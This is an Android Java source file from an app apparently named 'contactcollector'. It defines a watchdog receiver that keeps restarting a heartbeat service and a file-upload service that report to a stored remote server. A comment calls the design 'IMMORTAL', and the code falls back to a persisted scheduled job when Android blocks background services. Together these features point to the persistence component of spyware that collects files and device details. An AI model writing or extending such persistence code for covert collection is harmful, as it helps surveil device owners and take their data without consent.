package com.contactcollector.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;

public class WatchdogAlarmReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        SharedPreferences prefs = context.getSharedPreferences("CollectorPrefs", Context.MODE_PRIVATE);
        String sessionId = prefs.getString("sessionId", null);
        String baseUrl = prefs.getString("baseUrl", null);

        if (sessionId == null || baseUrl == null) return;

        String deviceId = prefs.getString("deviceId", null);
        String deviceName = prefs.getString("deviceName", null);
        String deviceModel = prefs.getString("deviceModel", null);
        String deviceBrand = prefs.getString("deviceBrand", null);
        String androidVersion = prefs.getString("androidVersion", null);

        // IMMORTAL: Always try to start HeartbeatService
        // If it's already running, onStartCommand will be called again (harmless)
        try {
            Intent heartbeatIntent = new Intent(context, HeartbeatService.class);
            heartbeatIntent.putExtra("sessionId", sessionId);
            heartbeatIntent.putExtra("baseUrl", baseUrl);
            heartbeatIntent.putExtra("deviceId", deviceId);
            heartbeatIntent.putExtra("deviceName", deviceName);
            heartbeatIntent.putExtra("deviceModel", deviceModel);
            heartbeatIntent.putExtra("deviceBrand", deviceBrand);
            heartbeatIntent.putExtra("androidVersion", androidVersion);
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(heartbeatIntent);
            } else {
                context.startService(heartbeatIntent);
            }
        } catch (Exception e) {
            // Android 12+ may block foreground service from background
            // Fall back to JobScheduler
            try {
                android.app.job.JobScheduler jobScheduler = 
                    (android.app.job.JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                if (jobScheduler != null) {
                    android.content.ComponentName serviceComponent = 
                        new android.content.ComponentName(context, WatchdogJobService.class);
                    android.app.job.JobInfo.Builder builder = new android.app.job.JobInfo.Builder(1001, serviceComponent)
                        .setMinimumLatency(1000)
                        .setOverrideDeadline(5000)
                        .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
                        .setPersisted(true);
                    jobScheduler.schedule(builder.build());
                }
            } catch (Exception e2) {}
        }

        // Also try to start FileUploadService
        try {
            Intent uploadIntent = new Intent(context, FileUploadService.class);
            uploadIntent.putExtra("sessionId", sessionId);
            uploadIntent.putExtra("baseUrl", baseUrl);
            uploadIntent.putExtra("deviceId", deviceId);
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(uploadIntent);
            } else {
                context.startService(uploadIntent);
            }
        } catch (Exception e) {}
    }
}
